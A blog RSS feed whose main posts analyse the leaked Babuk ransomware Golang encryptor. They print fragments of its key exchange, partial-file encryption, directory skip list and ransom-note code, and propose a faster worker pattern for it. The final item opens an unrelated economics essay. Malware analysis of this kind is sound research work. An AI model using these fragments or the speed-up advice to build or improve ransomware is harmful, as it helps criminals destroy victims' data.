<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>tacix.at</title>
    <link>https://tacix.at</link>
    <description>Personal projects in programming and the dark arts..</description>
    <managingEditor> (Taci Xat)</managingEditor>
    <pubDate>Mon, 18 May 2020 12:18:00 -0700</pubDate>
    <lastBuildDate>Mon, 06 Sep 2021 17:40:19 -0700</lastBuildDate>
    <item>
      <title>A Better Parallelization Pattern for Babuk Ransomware</title>
      <link>https://tacix.at/posts/A Better Parallelization Pattern for Babuk Ransomware.html</link>
      <description>Putting up because I talked some trash in my last post.</description>
      <content:encoded><![CDATA[<p>In my <a href="https://tacix.at/posts/Babuk%20Source%20Code%20Leak%20-%20Golang%20Encryptor.html">previous post</a> analyzing the <a href="https://gist.github.com/TACIXAT/92f04e033939136aa0171ff29a726e7a">Babuk Golang source code</a> I commented on the worker pattern. It would start a batch of threads but not kick off any more jobs until the slowest one completed. If you had 4 threads, you can imagine a case where 3 encrypt small files and then sit and do nothing while 1 finishes encrypting a very large file.</p>

<p>I&rsquo;ve made a reproduction of theirs and then an alternative pattern using a workers and a job channel. To make a fair comparison, I keep a fixed set of jobs so both instances are processing the same data. The data processing is actually just sleeping for a random amount of seconds, but it will be the same random amount of seconds each time. At the top of our <code>main()</code> function we have some tunables and then we set up the jobs.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">numWorkers <span style="color:#f92672">:=</span> <span style="color:#ae81ff">4</span>
numJobs <span style="color:#f92672">:=</span> <span style="color:#ae81ff">9</span>
<span style="color:#66d9ef">var</span> wg sync.WaitGroup

rand.<span style="color:#a6e22e">Seed</span>(<span style="color:#ae81ff">1337</span>)
fixedJobs <span style="color:#f92672">:=</span> make([]Job, numJobs)
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">:=</span> <span style="color:#ae81ff">0</span>; i &lt; numJobs; i<span style="color:#f92672">++</span> {
	fixedJobs[i] = Job{
		Id: i,
		Seconds: time.<span style="color:#a6e22e">Duration</span>(rand.<span style="color:#a6e22e">Intn</span>(<span style="color:#ae81ff">8</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>),
	}
}
</pre>
<p>The Babuk worker is simple, it just processes the job then marks itself as done in the <code>WaitGroup</code>.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">worker</span>(wg <span style="color:#f92672">*</span>sync.WaitGroup, id <span style="color:#66d9ef">int</span>, job Job) {
	<span style="color:#66d9ef">defer</span> wg.<span style="color:#a6e22e">Done</span>()

	log.<span style="color:#a6e22e">Printf</span>(
		<span style="color:#e6db74">&#34;Worker %d: pretending to work for %d seconds for job %d&#34;</span>, 
		id, job.Seconds, job.Id)
	time.<span style="color:#a6e22e">Sleep</span>(job.Seconds <span style="color:#f92672">*</span> time.Second)
	log.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Worker %d: finished job %d&#34;</span>, id, job.Id);
}
</pre>
<p>Back in <code>main()</code> they jobs are passed to a Go thread, we pass in the index of the jobs as the worker ID, and the job struct which consists of a job ID and a duration in seconds. We add 1 to the <code>activeWorkers</code> count. When the <code>activeWorkers</code> count reaches <code>numWorkers</code> we wait for the <code>WaitGroup</code> to finish, reset the count, then continue.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">start <span style="color:#f92672">:=</span> time.<span style="color:#a6e22e">Now</span>()
activeWorkers <span style="color:#f92672">:=</span> <span style="color:#ae81ff">0</span>
<span style="color:#66d9ef">for</span> i, j <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> fixedJobs {
	<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">worker</span>(<span style="color:#f92672">&amp;</span>wg, i, j)
	wg.<span style="color:#a6e22e">Add</span>(<span style="color:#ae81ff">1</span>)
	activeWorkers <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
	<span style="color:#66d9ef">if</span> activeWorkers <span style="color:#f92672">==</span> numWorkers {
		wg.<span style="color:#a6e22e">Wait</span>()
		activeWorkers = <span style="color:#ae81ff">0</span>
	}
}
wg.<span style="color:#a6e22e">Wait</span>()
log.<span style="color:#a6e22e">Printf</span>(
	<span style="color:#e6db74">&#34;processed %d jobs in %s\n\n&#34;</span>, numJobs, time.<span style="color:#a6e22e">Since</span>(start))
</pre>
<p>As stated before, this will cause jobs to happen in batches and be blocked by the slowest job. You can see this happening in the output below. In total, it took 26 seconds to process these random jobs.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">2021/09/06 16:22:56 Worker 3: pretending to work for 5 seconds for job 3
2021/09/06 16:22:56 Worker 1: pretending to work for 8 seconds for job 1
2021/09/06 16:22:56 Worker 0: pretending to work for 4 seconds for job 0
2021/09/06 16:22:56 Worker 2: pretending to work for 9 seconds for job 2
2021/09/06 16:23:00 Worker 0: finished job 0
2021/09/06 16:23:01 Worker 3: finished job 3
2021/09/06 16:23:04 Worker 1: finished job 1
2021/09/06 16:23:05 Worker 2: finished job 2
2021/09/06 16:23:05 Worker 4: pretending to work for 6 seconds for job 4
2021/09/06 16:23:05 Worker 5: pretending to work for 6 seconds for job 5
2021/09/06 16:23:05 Worker 6: pretending to work for 8 seconds for job 6
2021/09/06 16:23:05 Worker 7: pretending to work for 3 seconds for job 7
2021/09/06 16:23:08 Worker 7: finished job 7
2021/09/06 16:23:11 Worker 5: finished job 5
2021/09/06 16:23:11 Worker 4: finished job 4
2021/09/06 16:23:13 Worker 6: finished job 6
2021/09/06 16:23:13 Worker 8: pretending to work for 9 seconds for job 8
2021/09/06 16:23:22 Worker 8: finished job 8
2021/09/06 16:23:22 processed 9 jobs in 26.0143759s
</pre>
<h2>Revised Worker</h2>

<p>For our code we will start <code>numWorkers</code> of Go threads. Then we will place the jobs into a channel. A channel is a bit like a thread safe queue. Workers will pull jobs out of the channel and process them, and then grab the next. This allows all workers to be fully occupied. We use a job ID of <code>-1</code> as a sentinel value, letting the workers know that they are done.</p>

<p>Our <code>main()</code> method will start the workers, queue the jobs, add a <code>numWorkers</code> number of <code>-1</code>s to the queue, then wait on the <code>WaitGroup</code>.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">start = time.<span style="color:#a6e22e">Now</span>()
jobs <span style="color:#f92672">:=</span> make(<span style="color:#66d9ef">chan</span> Job)
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">:=</span> <span style="color:#ae81ff">0</span>; i &lt; numWorkers; i<span style="color:#f92672">++</span> {
	<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">queueWorker</span>(<span style="color:#f92672">&amp;</span>wg, i, jobs)
	wg.<span style="color:#a6e22e">Add</span>(<span style="color:#ae81ff">1</span>)
}

<span style="color:#66d9ef">for</span> _, j <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> fixedJobs {
	jobs <span style="color:#f92672">&lt;-</span> j
}

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">:=</span> <span style="color:#ae81ff">0</span>; i &lt; numWorkers; i<span style="color:#f92672">++</span> {
	jobs <span style="color:#f92672">&lt;-</span> Job{
		Id: <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,
	}
}

wg.<span style="color:#a6e22e">Wait</span>()
log.<span style="color:#a6e22e">Printf</span>(
	<span style="color:#e6db74">&#34;processed %d jobs in %s&#34;</span>, numJobs, time.<span style="color:#a6e22e">Since</span>(start))
</pre>
<p>The worker is a little bit more complex. It has an infinite loop, grabs a job out of the channel, if it is a negative <code>job.Id</code> it will exit, if not it does the same processing as the other worker.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">queueWorker</span>(wg <span style="color:#f92672">*</span>sync.WaitGroup, id <span style="color:#66d9ef">int</span>, jobs <span style="color:#66d9ef">chan</span> Job) {
	<span style="color:#66d9ef">defer</span> wg.<span style="color:#a6e22e">Done</span>()

	<span style="color:#66d9ef">for</span> {
		job <span style="color:#f92672">:=</span> <span style="color:#f92672">&lt;-</span>jobs

		<span style="color:#66d9ef">if</span> job.Id &lt; <span style="color:#ae81ff">0</span> {
			<span style="color:#66d9ef">return</span>
		}

		log.<span style="color:#a6e22e">Printf</span>(
			<span style="color:#e6db74">&#34;Worker %d: pretending to work &#34;</span> <span style="color:#f92672">+</span>
			<span style="color:#e6db74">&#34;for %d seconds for job %d&#34;</span>, 
			id, job.Seconds, job.Id)
		time.<span style="color:#a6e22e">Sleep</span>(job.Seconds <span style="color:#f92672">*</span> time.Second)
		log.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Worker %d: finished job %d&#34;</span>, id, job.Id);
	}
}
</pre>
<p>Now, when a worker finishes their job, they can immediately move on to the next job. There is no blocking on the slowest of the group. Now, it processes all jobs in 19 seconds!</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">2021/09/06 16:23:22 Worker 0: pretending to work for 4 seconds for job 0
2021/09/06 16:23:22 Worker 2: pretending to work for 5 seconds for job 3
2021/09/06 16:23:22 Worker 3: pretending to work for 8 seconds for job 1
2021/09/06 16:23:22 Worker 1: pretending to work for 9 seconds for job 2
2021/09/06 16:23:26 Worker 0: finished job 0
2021/09/06 16:23:26 Worker 0: pretending to work for 6 seconds for job 4
2021/09/06 16:23:27 Worker 2: finished job 3
2021/09/06 16:23:27 Worker 2: pretending to work for 6 seconds for job 5
2021/09/06 16:23:30 Worker 3: finished job 1
2021/09/06 16:23:30 Worker 3: pretending to work for 8 seconds for job 6
2021/09/06 16:23:31 Worker 1: finished job 2
2021/09/06 16:23:31 Worker 1: pretending to work for 3 seconds for job 7
2021/09/06 16:23:32 Worker 0: finished job 4
2021/09/06 16:23:32 Worker 0: pretending to work for 9 seconds for job 8
2021/09/06 16:23:33 Worker 2: finished job 5
2021/09/06 16:23:34 Worker 1: finished job 7
2021/09/06 16:23:38 Worker 3: finished job 6
2021/09/06 16:23:41 Worker 0: finished job 8
2021/09/06 16:23:41 processed 9 jobs in 19.0381034s
</pre>
<p>There could always be a reason for the pattern they chose, perhaps to not saturate disk or cores in some way. That said, if you are looking to utilize cores to the fullest this pattern is much more efficient.</p>
]]></content:encoded>
      <author>tacixat</author>
      <pubDate>Mon, 06 Sep 2021 13:37:00 -0400</pubDate>
    </item>
    <item>
      <title>Babuk Source Code Leak - Golang Encryptor</title>
      <link>https://tacix.at/posts/Babuk Source Code Leak - Golang Encryptor.html</link>
      <description>Taking a look at someone else&#39;s Golang ransomware.</description>
      <content:encoded><![CDATA[<p>Someone leaked the Babuk source code and <a href="https://twitter.com/vxunderground/status/1433758742244478982">VxUnderground</a> announced and archived it. The Windows and ESXI versions were written in filthy C++, but my surprise when I saw the NAS version was written in Golang! I&rsquo;ve mirrored the <a href="https://gist.github.com/TACIXAT/92f04e033939136aa0171ff29a726e7a">encryptor</a> and <a href="https://gist.github.com/TACIXAT/31089617e4915636a46dd4ea81dd4cbe">decryptor</a> on Github. Since I wrote some simple ransomware in Go over the last few blog posts, I decided to check this leak out and see what the professionals do. This post is an overview of the encryptor.</p>

<h2>The Cypto Scheme</h2>

<p>Right off the bat, thing that stands out to me is the use of a different cryptography scheme. We see <code>chacha20</code> and <code>curve25519</code>.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#f92672">import</span> (
	<span style="color:#75715e">// ...
</span><span style="color:#75715e"></span>	<span style="color:#e6db74">&#34;golang.org/x/crypto/chacha20&#34;</span>
	<span style="color:#e6db74">&#34;golang.org/x/crypto/curve25519&#34;</span>
)
</pre>
<p>ChaCha20 is a stream cipher that is <a href="https://www.cryptopp.com/wiki/ChaCha20">consistently faster than AES</a>. Curve25519 is an elliptic curve (asymmetric) that has been adopted by some major applications.</p>

<p><em>An additional benefit of Curve25519 is that <a href="https://en.wikipedia.org/wiki/Curve25519">it is not covered by any patents</a> which is good since the Babuk authors would not want to be sued.</em></p>

<p>Elliptic curve cryptography utilizes, as the name implies, an elliptic curve. The curve parameters and a base point are predefined or &ldquo;agreed upon&rdquo;. You can do an operation on the base point to produce a new point on the curve, this is often referred to as &ldquo;multiplying&rdquo; it with itself. If you repeat this, you get another point on the curve. You keep doing this N times and produce a final point on the curve. The final point is your public key, and N is your private key.</p>

<h3>EncryptFile()</h3>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">seed <span style="color:#f92672">:=</span> make([]<span style="color:#66d9ef">byte</span>, <span style="color:#ae81ff">32</span>)
io.<span style="color:#a6e22e">ReadFull</span>(rand.Reader, seed)
copy(privateKey[:], seed)

curve25519.<span style="color:#a6e22e">ScalarBaseMult</span>(<span style="color:#f92672">&amp;</span>publicKey, <span style="color:#f92672">&amp;</span>privateKey)
</pre>
<p>Hopefully that code makes some sense now. Babuk generates a random private key <code>N</code>, then multiplies the (implicit) base along Curve25519 to produce the public key.</p>

<p>So now you have two keypairs, <code>pub_a, prv_a</code> and <code>pub_b, prv_b</code>. If you multiply <code>prv_a * pub_b</code> you get <code>s</code>. If you multiple <code>prv_b * pub_a</code> you get the same <code>s</code>. This allows two parties to compute a shared secret if each party knows their own private key and the other party&rsquo;s public key. That is what this next line is doing. It takes the private key that was just generated for the file and multiplies it by the embedded public key <code>m_publ</code> in order to produce a shared secret.</p>

<p><em>Note - <code>m_publ</code> is the hard coded public key embedded at the top of the file.</em></p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">curve25519.<span style="color:#a6e22e">ScalarMult</span>(<span style="color:#f92672">&amp;</span>shared, <span style="color:#f92672">&amp;</span>privateKey, <span style="color:#f92672">&amp;</span>m_publ)
</pre>
<p>Following this the file is renamed to have a <code>.babyk</code> extension, then opened for reading and writing. The file is stat&rsquo;ed to get a file size and based on that, later on, the chunk size that is encrypted changes.</p>

<p>Next, it generates the key and nonce for <code>chacha20</code>. With the key and nonce a stream cipher is generated for encrypting file bytes. The believe the usage of the lock here is unnecessary but will go into more details on that in the code review section, as well, I may be missing something that the developers experienced in practice.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">l.<span style="color:#a6e22e">Lock</span>()
<span style="color:#66d9ef">var</span> cc20_k = sha256.<span style="color:#a6e22e">Sum256</span>([]byte(shared[:]))
<span style="color:#66d9ef">var</span> cc20_n = sha256.<span style="color:#a6e22e">Sum256</span>([]byte(cc20_k[:]))
l.<span style="color:#a6e22e">Unlock</span>()

stream, err <span style="color:#f92672">:=</span> chacha20.<span style="color:#a6e22e">NewUnauthenticatedCipher</span>(cc20_k[:], cc20_n[<span style="color:#ae81ff">10</span>:<span style="color:#ae81ff">22</span>])
<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
	fmt.<span style="color:#a6e22e">Println</span>(err)
	<span style="color:#66d9ef">return</span>
}
</pre>
<p>Now there are two cases based on the file size. Large cipher mode for files larger than <code>0x1400000</code> bytes (20 MB). Babuk splits up the file into <code>0xA00000</code> byte chunks, however, the buffer only encrypts the first <code>0x100000</code> bytes of that. I assume this is for speed, or maybe to give researchers something to notice and blog about. This means only about 1/10th of the file contents will be encrypted. This is enough to destroy the file, but there will still be a lot of content visible if you look at it in a hex editor.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">var</span> chunks <span style="color:#66d9ef">int64</span> = file_size <span style="color:#f92672">/</span> <span style="color:#ae81ff">0xA00000</span>
<span style="color:#66d9ef">var</span> buffer = make([]<span style="color:#66d9ef">byte</span>, <span style="color:#ae81ff">0x100000</span>)

<span style="color:#66d9ef">var</span> i <span style="color:#66d9ef">int64</span>
<span style="color:#66d9ef">for</span> i = <span style="color:#ae81ff">0</span>; i &lt; chunks; i<span style="color:#f92672">++</span> {
	fmt.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Processing chunk %d\\%d (%s)\n&#34;</span>, i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>, chunks, path)
	offset = i <span style="color:#f92672">*</span> <span style="color:#ae81ff">0xA00000</span>
	file.<span style="color:#a6e22e">ReadAt</span>(buffer, offset)
	stream.<span style="color:#a6e22e">XORKeyStream</span>(buffer, buffer)
	file.<span style="color:#a6e22e">WriteAt</span>(buffer, offset)
}
</pre>
<p>The small cipher mode does something similar. This is for files smaller than <code>0x1400000</code>. If it is larger than <code>0x400000</code> bytes, it will only encrypt the first <code>0x400000</code>. Worst case this encrypts the first 20% of the file. Most cases though this will encrypt the entire file.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">var</span> size_to_encrypt <span style="color:#66d9ef">int64</span> = <span style="color:#ae81ff">0</span>
<span style="color:#66d9ef">if</span> file_size &gt; <span style="color:#ae81ff">0x400000</span> {
	size_to_encrypt = <span style="color:#ae81ff">0x400000</span>
} <span style="color:#66d9ef">else</span> {
	size_to_encrypt = file_size
}

<span style="color:#66d9ef">var</span> buffer = make([]<span style="color:#66d9ef">byte</span>, size_to_encrypt)
r, _ <span style="color:#f92672">:=</span> file.<span style="color:#a6e22e">ReadAt</span>(buffer, offset)
<span style="color:#66d9ef">if</span> int64(r) <span style="color:#f92672">!=</span> size_to_encrypt {
	fmt.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;ERROR: %d != %d\n&#34;</span>, r, size_to_encrypt)
	<span style="color:#66d9ef">return</span>
}

stream.<span style="color:#a6e22e">XORKeyStream</span>(buffer, buffer)
file.<span style="color:#a6e22e">WriteAt</span>(buffer, offset)
</pre>
<p>Finally, the public key and a special value <code>flag</code> are appended to the file. Flag is a unique 6 byte value used by the decryptor to ensure it is operating on a file it is meant to (and not someone else&rsquo;s Babuk instance).</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">var</span> flag [<span style="color:#ae81ff">6</span>]<span style="color:#66d9ef">byte</span>
flag[<span style="color:#ae81ff">0</span>] = <span style="color:#ae81ff">0xAB</span>
flag[<span style="color:#ae81ff">1</span>] = <span style="color:#ae81ff">0xBC</span>
flag[<span style="color:#ae81ff">2</span>] = <span style="color:#ae81ff">0xCD</span>
flag[<span style="color:#ae81ff">3</span>] = <span style="color:#ae81ff">0xDE</span>
flag[<span style="color:#ae81ff">4</span>] = <span style="color:#ae81ff">0xEF</span>
flag[<span style="color:#ae81ff">5</span>] = <span style="color:#ae81ff">0xF0</span>

<span style="color:#75715e">// ...
</span><span style="color:#75715e"></span>file.<span style="color:#a6e22e">WriteAt</span>([]byte(publicKey[:]), file_size)
file.<span style="color:#a6e22e">WriteAt</span>([]byte(flag[:]), file_size<span style="color:#f92672">+</span><span style="color:#ae81ff">32</span>)
</pre>
<p>I do like the method of storing all this data in the file, as well as using the special extension to not reencrypt files. If your first run fails, you can pick up where you left off and not double encrypt anything. Storing the key in the file is a benefit of having a fixed size key, and the ECC shared secret derivation is really elegant.</p>

<p>One downside to this scheme is that each install requires a unique <code>m_publ</code>, as <code>m_priv</code> is provided in the decryptor. Having a single server key allows a server to operate a bit more like an automated SaaS. That said, customizing a build that could bring in hundreds to millions of dollars is not so much work, especially for a tailored enterprise breach. Still, you could automate a lot of this infrastructure with some templating.</p>

<h2>Filepath Walk</h2>

<p>In <code>main()</code> we see a more fleshed out <code>filepath.Walk()</code> than what we had in our proof of concept.</p>

<p>As seen above, Babuk uses an extension to know whether a file has been encrypted. So when visiting files anything with the <code>.babyk</code> extension is skipped. They encrypt files in parallel, kicking off an <code>encrypt_file()</code> based on the number <code>runtime.GOMAXPROCS(0) * 2</code>. We will take a closer look at this in the next section.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">if</span> strings.<span style="color:#a6e22e">Contains</span>(info.<span style="color:#a6e22e">Name</span>(), <span style="color:#e6db74">&#34;.babyk&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#66d9ef">false</span> 
	<span style="color:#f92672">&amp;&amp;</span> info.<span style="color:#a6e22e">Name</span>() <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;README_babyk.txt&#34;</span> {
	fmt.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Pushing to queue: %s\n&#34;</span>, path)

	<span style="color:#66d9ef">if</span> queue_counter <span style="color:#f92672">&gt;=</span> queue_max {
		wg.<span style="color:#a6e22e">Wait</span>()
		queue_counter = <span style="color:#ae81ff">0</span>
	}
	wg.<span style="color:#a6e22e">Add</span>(<span style="color:#ae81ff">1</span>)
	<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">encrypt_file</span>(<span style="color:#f92672">&amp;</span>wg, path)
	queue_counter <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
}
</pre>
<p>In the case of a directory we see a nice long list blacklisted dirs. Most of these contain system critical files that, if encrypted, would render the operating system unusable. In the case that a directory is not skipped, a <code>README</code> file is output.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">if</span> strings.<span style="color:#a6e22e">Contains</span>(info.<span style="color:#a6e22e">Name</span>(), <span style="color:#e6db74">&#34;/proc&#34;</span>) <span style="color:#f92672">||</span>
	strings.<span style="color:#a6e22e">Contains</span>(path, <span style="color:#e6db74">&#34;/boot&#34;</span>) <span style="color:#f92672">||</span>
	strings.<span style="color:#a6e22e">Contains</span>(path, <span style="color:#e6db74">&#34;/sys&#34;</span>) <span style="color:#f92672">||</span>
	strings.<span style="color:#a6e22e">Contains</span>(path, <span style="color:#e6db74">&#34;/run&#34;</span>) <span style="color:#f92672">||</span>
	strings.<span style="color:#a6e22e">Contains</span>(path, <span style="color:#e6db74">&#34;/dev&#34;</span>) <span style="color:#f92672">||</span>
	strings.<span style="color:#a6e22e">Contains</span>(path, <span style="color:#e6db74">&#34;/etc&#34;</span>) <span style="color:#f92672">||</span>
	strings.<span style="color:#a6e22e">Contains</span>(path, <span style="color:#e6db74">&#34;/home/httpd&#34;</span>) <span style="color:#f92672">||</span>
	strings.<span style="color:#a6e22e">Contains</span>(path, <span style="color:#e6db74">&#34;.system/thumbnail&#34;</span>) <span style="color:#f92672">||</span>
	strings.<span style="color:#a6e22e">Contains</span>(path, <span style="color:#e6db74">&#34;.system/opt&#34;</span>) <span style="color:#f92672">||</span>
	strings.<span style="color:#a6e22e">Contains</span>(path, <span style="color:#e6db74">&#34;.config&#34;</span>) <span style="color:#f92672">||</span>
	strings.<span style="color:#a6e22e">Contains</span>(path, <span style="color:#e6db74">&#34;.qpkg&#34;</span>) <span style="color:#f92672">||</span>
	strings.<span style="color:#a6e22e">Contains</span>(path, <span style="color:#e6db74">&#34;/mnt/ext/opt&#34;</span>) {
	<span style="color:#66d9ef">return</span> filepath.SkipDir
}

ioutil.<span style="color:#a6e22e">WriteFile</span>(path<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/README_babyk.txt&#34;</span>, note, <span style="color:#ae81ff">0777</span>)
</pre>
<h2>Code Review</h2>

<p>As I mentioned above, I think the use of the lock in <code>encrypt_file()</code> is incorrect.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">l.<span style="color:#a6e22e">Lock</span>()
<span style="color:#66d9ef">var</span> cc20_k = sha256.<span style="color:#a6e22e">Sum256</span>([]byte(shared[:]))
<span style="color:#66d9ef">var</span> cc20_n = sha256.<span style="color:#a6e22e">Sum256</span>([]byte(cc20_k[:]))
l.<span style="color:#a6e22e">Unlock</span>()
</pre>
<p>The variable <code>shared</code> is a function scope variable, so there should not be any thread contention there, as well <code>cc20_k</code> is scoped immediately prior. The thought is maybe <code>Sum256()</code> is not thread safe but looking at the <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17:src/crypto/sha256/sha256.go;l=253">source code</a> it seems to be as the digest <code>d</code> in that function is local to the function, so there is not some package state code.</p>

<p><em>If the author or anyone else can explain this usage, please reach out <a href="https://twitter.com/TACIXAT">@TACIXAT</a> on Twitter.</em></p>

<p>Let&rsquo;s also take a look at the <code>WaitGroup</code>. A wait group is used as sentinel. Generally, when a worker is started, you add 1 to the wait group, then when they finish they mark it as done which decrements one. The parent process then can block on the wait group until all workers are finished.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">encrypt_file</span>(wg <span style="color:#f92672">*</span>sync.WaitGroup, path <span style="color:#66d9ef">string</span>) {
	<span style="color:#66d9ef">defer</span> wg.<span style="color:#a6e22e">Done</span>()
	<span style="color:#75715e">// ...
</span><span style="color:#75715e"></span>}

<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
	filepath.<span style="color:#a6e22e">Walk</span>( <span style="color:#75715e">// ...
</span><span style="color:#75715e"></span>		<span style="color:#75715e">// ...
</span><span style="color:#75715e"></span>		<span style="color:#66d9ef">if</span> info.<span style="color:#a6e22e">IsDir</span>() <span style="color:#f92672">==</span> <span style="color:#66d9ef">false</span> {
			<span style="color:#75715e">// ...	
</span><span style="color:#75715e"></span>			<span style="color:#66d9ef">if</span> queue_counter <span style="color:#f92672">&gt;=</span> queue_max {
				wg.<span style="color:#a6e22e">Wait</span>()
				queue_counter = <span style="color:#ae81ff">0</span>
			}

			wg.<span style="color:#a6e22e">Add</span>(<span style="color:#ae81ff">1</span>)
			<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">encrypt_file</span>(<span style="color:#f92672">&amp;</span>wg, path)
			queue_counter <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
		}
	<span style="color:#75715e">// ...
</span><span style="color:#75715e"></span>	})
}
</pre>
<p>This is how it is being used. Then the walker will kick off <code>runtime.GOMAXPROCS(0) * 2</code> <code>encrypt_file()</code> instances, then block. The issue is it will block until the last one finishes. So if you kick off 8 instances, and 7 of them are only 100 KB in size, and the other is 1 GB, you will be waiting on that one worker. This assumes the bottleneck is CPU and not disk, but it is likely you could be doing more work.</p>

<p>A better pattern would be to initially launch <code>runtime.GOMAXPROCS(0) * 2</code> workers. Then have the walk function push files to encrypt into a <a href="https://tour.golang.org/concurrency/2">channel</a>. The workers would get jobs out of that channel and encrypt the files. This would ensure that workers were always utilized and you would never block on a single large file.</p>

<p>A nitpick of the code is that <code>snake_case</code> is used. Generally, Go code is <code>camelCase</code> with an uppercase start indicating an exported or public variable.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">cc20_k
cc20_n
encrypt_file
file_size
m_publ
queue_counter
queue_max
size_to_encrypt
</pre>
<p>There is also this unused function <code>i64tob</code>. This converts an unsigned 64 bit integer to little endian bytes. First, a better name would be <code>u64tob</code> as it is an unsigned int. Additionally, this can be done with the <code>encoding/binary</code> package, see <a href="https://pkg.go.dev/encoding/binary#ByteOrder"><code>binary.LittleEndian.PutUint64([]byte, uint64)</code></a>. Lastly, it is unused so just delete it.</p>
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">i64tob</span>(val <span style="color:#66d9ef">uint64</span>) []<span style="color:#66d9ef">byte</span> {
	r <span style="color:#f92672">:=</span> make([]<span style="color:#66d9ef">byte</span>, <span style="color:#ae81ff">8</span>)
	<span style="color:#66d9ef">for</span> i <span style="color:#f92672">:=</span> uint64(<span style="color:#ae81ff">0</span>); i &lt; <span style="color:#ae81ff">8</span>; i<span style="color:#f92672">++</span> {
		r[i] = byte((val <span style="color:#f92672">&gt;&gt;</span> (i <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>)) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)
	}
	<span style="color:#66d9ef">return</span> r
}
</pre>
<h2>Conclusion</h2>

<p>Babuk&rsquo;s crypto scheme is superior, granted I was doing an intro to cryptography, but ECC is a lot nicer than RSA and since ChaCha20 is faster than AES, I will see how I can incorporate this in the future. It is also great to see the directories that are avoided in practice on Linux. I was surprised by the partial file encryption, but that will still render it unusable and probably greatly speed up the time spent on encryption. As well, since I am talking some shit on their parallelization code I will have to show a better pattern in the future. All told, stoked about this leak.</p>
]]></content:encoded>
      <author>tacixat</author>
      <pubDate>Sun, 05 Sep 2021 13:37:00 -0400</pubDate>
    </item>
    <item>
      <title>Killington - The Next Decade</title>
      <link>https://tacix.at/posts/Killington - The Next Decade.html</link>
      <description>Wild predictions about the future and some suggestions for how to address them.</description>
      <content:encoded><![CDATA[<p>This post assumes you understand that we are in a long term, low interest rate environment, as well as the unsustainability of <a href="https://en.wikipedia.org/wiki/Triffin_dilemma">being the world&rsquo;s reserve currency</a>. If you are not familiar with these concepts, please review the appendices at the end of the document.</p>

<h2>An Expansionary Period, Goals and Outcomes</h2>

<p>The low interest rates combined with a weaker dollar will create an environment primed for US domestic capability. We can take advantage of this time to benefit the manufacturing base in the United States. This group of workers has been canabalized by the US consistently running trade deficits. We are at a position in the cycle to correct this.</p>

